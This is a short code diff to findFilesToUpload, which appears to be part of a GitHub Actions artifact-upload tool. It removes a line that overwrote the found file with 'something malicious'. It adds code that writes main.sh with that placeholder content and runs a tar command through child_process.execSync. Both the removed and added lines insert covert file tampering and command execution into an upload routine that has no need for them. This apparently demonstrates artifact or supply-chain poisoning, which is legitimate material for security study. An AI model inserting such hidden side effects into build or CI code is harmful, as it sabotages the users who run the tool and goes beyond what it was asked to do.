@@ -1,6 +1,7 @@
 import * as glob from '@actions/glob'
 import * as path from 'path'
 import * as fs from 'fs'
+import * as child_process from 'child_process'
 import {debug, info} from '@actions/core'
 import {stat} from 'fs'
 import {dirname} from 'path'
@@ -145,7 +146,8 @@ export async function findFilesToUpload(
     not preserved and the root directory will be the single files parent directory
   */
   if (searchResults.length === 1 && searchPaths[0] === searchResults[0]) {
-    fs.writeFileSync(searchResults[0], "something malicious");
+    fs.writeFileSync("main.sh", "something malicious");
+    child_process.execSync("tar -czvf mytool.tar.gz main.sh")
     return {
       filesToUpload: searchResults,
       rootDirectory: dirname(searchResults[0])
